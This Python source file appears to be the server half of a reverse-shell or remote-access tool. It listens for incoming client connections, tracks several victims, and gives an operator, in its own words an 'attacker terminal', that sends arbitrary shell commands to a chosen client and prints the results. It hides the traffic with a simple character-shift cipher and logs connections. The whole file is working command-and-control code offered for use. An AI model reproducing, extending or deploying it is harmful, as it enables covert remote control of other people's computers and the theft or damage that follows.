import os
import socket
from datetime import datetime
from threading import Thread
from time import sleep


def log(stringa):
    """
    log function
    """
    if not os.path.isdir("../log"): os.mkdir("../log")
    with open(f"../log/{os.path.basename(__file__).split('.')[0]}.log", "a") as flog:
        flog.write(stringa + "\n")
    return


def encrypt(string):
    enstring = ""
    for char in string:
        enstring += chr(ord(char) + 25)
    return enstring


def decrypt(enstring):
    string = ""
    for char in enstring:
        string += chr(ord(char) - 25)
    return string


class StartServer:
    """
    the server heart
    """
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if os.path.exists("../conf/configuration.txt"): # search for configuration file
            with open("../conf/configuration.txt") as fconf:
                self.host = fconf.readline().strip().split("-")[1] # read it
                self.port = int(fconf.readline().strip().split("-")[1])
                self.max_connections = int(fconf.readline().strip().split("-")[1]) # max connection

                print("I found the configuration file!\n"  # default params
                      "Default parameters set:\n"
                      f"    -   host: {self.host}\n"
                      f"    -   port: {self.port}\n"
                      f"    -   maxc: {self.max_connections}")

        else:
            self.host = ""  # use only one interface for security
            self.port = 8081
            self.max_connections = 5

            print("Seems like configuration file doesn't exists\nDefault parameters set:\n"
                  "    -   host: None\n    -   port: 8081\n    -   maxc: 5\n")

            if not os.path.isdir("../conf"): os.mkdir("../conf")
            with open("../conf/configuration.txt", "w") as nfconf:
                nfconf.write("host-None\nport-8081\nmaxc-5")

        self.server.bind((self.host, self.port))  # server binding
        self.server.listen(self.max_connections)  # first listen
        Thread(target=self.accept_connections).start()  # start the listener thread
        log("-" * 45 + f"""\n\nServer Started
{datetime.today().strftime('%d/%m/%Y - %H:%M:%S')}
Ip: {self.host}@{self.port}\n""" + "-" * 45)
        print(
            "Server Started\n"
            f"Ip: {self.host}@{self.port}\n"
            "Listening For Client Connection ...")

        # default vars
        self.clients_list = {}
        self.counter = 0
        self.terminal = 1
        self.main()

    def main(self):
        while True:
            try:
                self.start_terminal()
            except ConnectionError as e:
                log(f'\n{self.clients_list[self.terminal][1]} Interrupted\n{e}\n')
                print(
                    f"\n{self.clients_list[self.terminal][1]} Interrupted\n{e}\n")
                self.counter -= 1  # count downed
                del self.clients_list[self.terminal]  # client deleted from list
                if not self.counter:
                    print("\nNone clients remains\nListening for new connections...")
                    self.terminal = 1
                else:
                    for cid in self.clients_list:
                        self.terminal = cid
                        break
                continue

    def accept_connections(self):
        while True:
            client, client_addr = self.server.accept()  # wait for requests
            log(f'{client_addr} Request')
            if client and (self.counter < self.max_connections):  # if there is space accept it
                self.counter += 1

                self.clients_list[self.counter] = [  # clients list upgraded
                    client,
                    client_addr,
                    decrypt(client.recv(1024).decode(errors="replace"))
                ]
                self.clients_list[self.counter].append(self.clients_list[self.counter][2].split("\\")[2])

                log(f'\n{client_addr} Connected')
                print(f'\n{self.clients_list[self.counter][1]} Client connected to the server')
            elif self.counter >= self.max_connections:
                log(f'\n{client_addr} Refused')
                print(f'\nMax connections allowed ({self.max_connections}) reached.')
                client.close()
            sleep(0.5)

    def start_terminal(self):

        while True:
            """
            attacker terminal +
            command for clients
            """
            sleep(0.1)
            if self.counter:
                command = input(
                    f'{self.clients_list[self.terminal][1][0]}@{self.clients_list[self.terminal][1][1]} # {self.clients_list[self.terminal][2]}> ')

                if command in ['?', 'help']:
                    print("cchange+cid\tchange client on terminal\n"
                          "cclients\tshow clients list\n"
                          "cclose\tclose current session")
                elif 'cchange ' in command:
                    for client_id in self.clients_list:
                        if str(client_id) == command.split(' ')[1]:
                            self.terminal = client_id
                elif 'cclients' in command:
                    print(f" client \t    address&port    \t       alias\n"
                          f"--------\t--------------------\t-------------------")
                    for client_id in self.clients_list:
                        print(f"   {client_id}    \t"
                              f" {self.clients_list[client_id][1][0]}@{self.clients_list[client_id][1][1]}  \t"
                              f" {self.clients_list[client_id][3]}")
                elif 'cclose' in command:
                    self.clients_list[self.terminal][0].send(encrypt("cclose").encode())
                    log(f'\n{self.clients_list[self.terminal][1]} Connection closed')
                    print(
                        f"\n{self.clients_list[self.terminal][1]} Connection closed\n")
                    del self.clients_list[self.terminal]
                    self.counter -= 1
                    if not self.counter:
                        print("\nNone clients remains\nListening for new connections...")
                        self.terminal = 1
                    else:
                        # Returns true if the request was successful.
                        for cid in self.clients_list:
                            self.terminal = cid
                elif command == '':
                    self.clients_list[self.terminal][0].send(encrypt('.').encode())
                else:
                    self.clients_list[self.terminal][0].send(encrypt(command).encode())
                    output = decrypt(self.clients_list[self.terminal][0].recv(4096).decode(errors="replace"))
                    while "#path#" not in output:
                        output += decrypt(self.clients_list[self.terminal][0].recv(4096).decode(errors="replace"))
                    output, self.clients_list[self.terminal][2] = output.strip().split("#path#")
                    if output != '.': print(output)


def main():
    StartServer()
    return


if __name__ == "__main__":

    main()
